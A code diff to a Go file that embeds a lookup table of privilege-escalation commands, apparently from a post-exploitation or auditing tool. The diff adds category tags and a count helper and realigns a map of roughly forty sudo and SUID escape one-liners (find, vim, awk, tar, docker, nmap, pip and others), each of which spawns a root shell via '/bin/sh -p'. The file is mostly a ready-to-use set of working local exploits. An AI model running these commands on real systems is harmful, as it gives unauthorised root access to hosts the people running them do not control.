@@ -6,6 +6,12 @@ package main
 
 var gtfoLookup = map[string]string{}
 
+// gtfoCategory tracks where each entry applies: "suid-shell" or "sudo".
+var gtfoCategory = map[string]string{}
+
+// GTFOCount returns the number of embedded techniques.
+func GTFOCount() int { return len(gtfoLookup) }
+
 func init() {
 	// SUID bins — spawn root shell
 	suidBins := []string{
@@ -53,60 +59,62 @@ func init() {
 	}
 
 	sudoOnly := map[string]string{
-		"find":    `find . -exec /bin/sh -p \; -quit`,
-		"vim":     `vim -c ':!/bin/sh -p'`,
-		"vi":      `vi -c ':!/bin/sh -p'`,
-		"less":    `less /etc/passwd; !/bin/sh -p`,
-		"more":    `more /etc/passwd; !/bin/sh -p`,
-		"man":     `man man; !/bin/sh -p`,
-		"awk":     `awk 'BEGIN {system("/bin/sh -p")}'`,
-		"gawk":    `gawk 'BEGIN {system("/bin/sh -p")}'`,
-		"nawk":    `nawk 'BEGIN {system("/bin/sh -p")}'`,
-		"sed":     `sed -n '1e /bin/sh -p' /etc/hosts`,
-		"gdb":     `gdb -nx -ex '!sh -p' -ex quit`,
-		"nmap":    `echo "os.execute('/bin/sh -p')" > /tmp/nmap.script; nmap --script=/tmp/nmap.script`,
-		"tcpdump": `echo $'id\n/bin/sh -p' > /tmp/.t; tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/.t -Z root`,
-		"tar":     `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`,
-		"zip":     `zip /tmp/test.zip /etc/hosts -T -TT '/bin/sh -p #'`,
-		"unzip":   `unzip -K test.zip -d /tmp`,
-		"rsync":   `rsync -e 'sh -c "sh -p 0<&2 1>&2"' 127.0.0.1:/dev/null`,
-		"scp":     `scp -S /path/to/script x y:`,
-		"socat":   `socat stdin exec:/bin/sh`,
-		"env":     `env /bin/sh -p`,
-		"nice":    `nice /bin/sh -p`,
-		"timeout": `timeout 7d /bin/sh -p`,
-		"stdbuf":  `stdbuf -i0 /bin/sh -p`,
-		"watch":   `watch -x sh -c 'reset; exec sh -p 1>&0 2>&0'`,
-		"make":    `COMMAND='/bin/sh -p' make -s`,
-		"pip":     `pip install --editable=. --no-deps; echo "import pty; pty.spawn('/bin/sh')" > setup.py`,
-		"pip3":    `pip3 install --editable=. --no-deps; echo "import pty; pty.spawn('/bin/sh')" > setup.py`,
-		"npm":     `npm exec sh -p`,
-		"gem":     `gem open -e '/bin/sh -p' rdoc`,
-		"git":     `git -p help config; !/bin/sh -p`,
-		"ssh":     `ssh -o ProxyCommand=';/bin/sh -p 0<&2 1>&2' x`,
-		"docker":  `docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`,
-		"lxc":     `lxc exec container /bin/sh`,
-		"apache2": `apache2 -f /etc/passwd`,
-		"cpan":    `cpan; !/bin/sh -p`,
-		"ed":      `ed; !/bin/sh -p`,
-		"ex":      `ex; !/bin/sh -p`,
-		"ftp":     `ftp; !/bin/sh -p`,
-		"wall":    `wall --nobanner; exec /bin/sh -p`,
-		"systemctl": `systemctl; !/bin/sh -p`,
+		"find":       `find . -exec /bin/sh -p \; -quit`,
+		"vim":        `vim -c ':!/bin/sh -p'`,
+		"vi":         `vi -c ':!/bin/sh -p'`,
+		"less":       `less /etc/passwd; !/bin/sh -p`,
+		"more":       `more /etc/passwd; !/bin/sh -p`,
+		"man":        `man man; !/bin/sh -p`,
+		"awk":        `awk 'BEGIN {system("/bin/sh -p")}'`,
+		"gawk":       `gawk 'BEGIN {system("/bin/sh -p")}'`,
+		"nawk":       `nawk 'BEGIN {system("/bin/sh -p")}'`,
+		"sed":        `sed -n '1e /bin/sh -p' /etc/hosts`,
+		"gdb":        `gdb -nx -ex '!sh -p' -ex quit`,
+		"nmap":       `echo "os.execute('/bin/sh -p')" > /tmp/nmap.script; nmap --script=/tmp/nmap.script`,
+		"tcpdump":    `echo $'id\n/bin/sh -p' > /tmp/.t; tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/.t -Z root`,
+		"tar":        `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`,
+		"zip":        `zip /tmp/test.zip /etc/hosts -T -TT '/bin/sh -p #'`,
+		"unzip":      `unzip -K test.zip -d /tmp`,
+		"rsync":      `rsync -e 'sh -c "sh -p 0<&2 1>&2"' 127.0.0.1:/dev/null`,
+		"scp":        `scp -S /path/to/script x y:`,
+		"socat":      `socat stdin exec:/bin/sh`,
+		"env":        `env /bin/sh -p`,
+		"nice":       `nice /bin/sh -p`,
+		"timeout":    `timeout 7d /bin/sh -p`,
+		"stdbuf":     `stdbuf -i0 /bin/sh -p`,
+		"watch":      `watch -x sh -c 'reset; exec sh -p 1>&0 2>&0'`,
+		"make":       `COMMAND='/bin/sh -p' make -s`,
+		"pip":        `pip install --editable=. --no-deps; echo "import pty; pty.spawn('/bin/sh')" > setup.py`,
+		"pip3":       `pip3 install --editable=. --no-deps; echo "import pty; pty.spawn('/bin/sh')" > setup.py`,
+		"npm":        `npm exec sh -p`,
+		"gem":        `gem open -e '/bin/sh -p' rdoc`,
+		"git":        `git -p help config; !/bin/sh -p`,
+		"ssh":        `ssh -o ProxyCommand=';/bin/sh -p 0<&2 1>&2' x`,
+		"docker":     `docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`,
+		"lxc":        `lxc exec container /bin/sh`,
+		"apache2":    `apache2 -f /etc/passwd`,
+		"cpan":       `cpan; !/bin/sh -p`,
+		"ed":         `ed; !/bin/sh -p`,
+		"ex":         `ex; !/bin/sh -p`,
+		"ftp":        `ftp; !/bin/sh -p`,
+		"wall":       `wall --nobanner; exec /bin/sh -p`,
+		"systemctl":  `systemctl; !/bin/sh -p`,
 		"journalctl": `journalctl; !/bin/sh -p`,
-		"mysql":   `mysql -e '\\! /bin/sh -p'`,
-		"psql":    `psql -c '\\!' postgres`,
-		"sqlite3": `sqlite3 /dev/null '.shell /bin/sh -p'`,
+		"mysql":      `mysql -e '\\! /bin/sh -p'`,
+		"psql":       `psql -c '\\!' postgres`,
+		"sqlite3":    `sqlite3 /dev/null '.shell /bin/sh -p'`,
 	}
 
 	// Build lookup
 	for _, bin := range suidBins {
 		if cmd, ok := shellCmd[bin]; ok {
 			gtfoLookup[bin] = cmd
+			gtfoCategory[bin] = "suid-shell"
 		}
 	}
 	for bin, cmd := range sudoOnly {
 		gtfoLookup[bin] = cmd
+		gtfoCategory[bin] = "sudo"
 	}
 }
 
